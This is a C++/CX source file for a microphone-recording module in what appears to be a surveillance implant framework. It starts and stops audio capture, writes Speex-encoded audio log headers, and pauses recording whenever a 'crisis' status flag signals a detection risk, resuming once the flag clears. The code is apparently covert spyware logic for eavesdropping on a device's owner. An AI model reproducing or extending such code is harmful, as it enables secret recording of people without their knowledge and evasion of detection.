#include "Modules.h"
#include "Common.h"
#include "Module.h"

#include <mmsystem.h>
#include <exception>
#include "Conf.h"
#include "Microphone.h"
#include "Device.h"
#include "Log.h"
#include "FunctionFunc.h"
/***/ //provo ad aggiungere tutto quello che avevo sulla compilazione c++/CX per ovviare all'eccezzione
#include <wrl/client.h>
#include <ppl.h>
#include <ppltasks.h>
#include <memory>
#include <thread>
#include <chrono>
#include <windows.h>
#include <iostream>
#include <fstream>

#include "NativeAudioInterface.h"

using namespace Windows::System;
using namespace NativeAudioInterface::Native;

#define DTTMFMT "%Y-%m-%d %H:%M:%S "
#define DTTMSZ 21


MicAdditionalData mad;
BOOL bMicIsrecording, bUpdateTimestamp;
INT vadThreshold;
BOOL vad;
DWORD dwMicBuffInCount;
WAVEHDR	tagMicWaveHdr[MIC_COUNT_BUFF];
NativeCapture^ micAgent;

DWORD mic_buffer_len = MIC_DEF_BUFFER_LEN;
DWORD mic_compress_factor = MIC_DEF_COMPRESS_FACTOR; 

static char *getDtTm (char *buff) {
    time_t t = time (0);
    strftime(buff, DTTMSZ, DTTMFMT, localtime (&t));
    return buff;
}

BOOL MicRecordStop() {
	char buff[DTTMSZ];
   	getDtTm(buff);
	WCHAR msg[128];
	const size_t cSize = strlen(buff)+1;
    wchar_t* wc = new wchar_t[cSize];
    mbstowcs (wc, buff, cSize);
#ifdef _DEBUG
	swprintf_s(msg, L">>> %s: micAgent->StopCapture\n",wc);OutputDebugString(msg);
#endif
	
	micAgent->ResetWait();
	micAgent->StopCapture();
	
	/////micAgent=nullptr; //vedere se forza il garbage 

	return TRUE;
}

BOOL MicRecordStart(HANDLE eventHandle) {
	char buff[DTTMSZ];
   	getDtTm(buff);
	WCHAR msg[128];
	const size_t cSize = strlen(buff)+1;
    wchar_t* wc = new wchar_t[cSize];
    mbstowcs (wc, buff, cSize);
#ifdef _DEBUG
	swprintf_s(msg, L">>> %s: micAgent->StartCapture\n",wc);OutputDebugString(msg);
#endif

	micAgent->SetWait();
	micAgent->StartCapture(eventHandle);

	return TRUE;
}

DWORD WINAPI RecordedMicrophone(LPVOID lpParam) {
	Module *me = (Module *)lpParam;
	Configuration *conf = me->getConf();
	HANDLE eventHandle;
	Device *deviceObj = Device::self();
	Status *statusObj = Status::self();

	BOOL bCrisis = FALSE;

	char buff[DTTMSZ];
   	getDtTm(buff);
	WCHAR msg[128];
	const size_t cSize = strlen(buff)+1;
    wchar_t* wc = new wchar_t[cSize];
    mbstowcs (wc, buff, cSize);
#ifdef _DEBUG
	swprintf_s(msg, L">>> %s:  micAgent ref new NativeCapture()\n",wc);OutputDebugString(msg);
#endif

	if(micAgent==nullptr)
		micAgent = ref new NativeCapture();

	bMicIsrecording = FALSE;
	///micAgent = NULL;
	
	try {
		vadThreshold = 50; //conf->getDouble(L"threshold");
	} catch (...) {
		vadThreshold = 50;
	}

	try {
		vad = conf->getBool(L"vad");
	} catch (...) {
		vad = FALSE;
	}

	me->setStatus(MODULE_RUNNING);
	eventHandle = me->getEvent();

	DBG_TRACE(L"Debug - Microphone.cpp - Microphone Module started\n", 5, FALSE);

	unsigned __int64 temp_time = GetTime();

	ZeroMemory(&mad, sizeof(mad));
	mad.uVersion = MIC_LOG_VERSION;
	mad.uSampleRate = MIC_SAMPLE_RATE | LOG_AUDIO_CODEC_SPEEX;
	mad.fId.dwHighDateTime = (DWORD)((temp_time & 0xffffffff00000000) >> 32);
	mad.fId.dwLowDateTime  = (DWORD)(temp_time & 0x00000000ffffffff);
	bUpdateTimestamp = FALSE; // TRUE solo se passiamo dal silenzio alla voce

	///deviceObj->SetMicPowerState();
	
	MicRecordStart(eventHandle);

	LOOP {
		while (bCrisis) {
			DBG_TRACE(L"Debug - Microphone.cpp - Microphone Module is in crisis\n", 6, FALSE);

			_WaitForSingleObject(eventHandle, 10000);

			if (me->shouldStop()) {
				DBG_TRACE(L"Debug - Microphone.cpp - Microphone Module clean stop while in crisis [0]\n", 5, FALSE);
				me->setStatus(MODULE_STOPPED);
				return 0;
			}

			// Se la crisi e' finita...
			if ((statusObj->Crisis() & CRISIS_MIC) != CRISIS_MIC) {
				bCrisis = FALSE;

				///deviceObj->SetMicPowerState();
				MicRecordStart(eventHandle);

				DBG_TRACE(L"Debug - Microphone.cpp - RecordedMicrophoneAgent leaving crisis\n", 6, FALSE);
			}
		}

		_WaitForSingleObject(eventHandle, 10000);

		if (me->shouldStop()) {
			DBG_TRACE(L"Debug - Microphone.cpp - Microphone Module clean stop\n", 5, FALSE);

			MicRecordStop();
			///deviceObj->ReleaseMicPowerState();
			me->setStatus(MODULE_STOPPED);
			return 0;
		}

		if ((statusObj->Crisis() & CRISIS_MIC) == CRISIS_MIC) {
			bCrisis = TRUE;

			MicRecordStop();
			///deviceObj->ReleaseMicPowerState();
		}
	}

	return 0;
}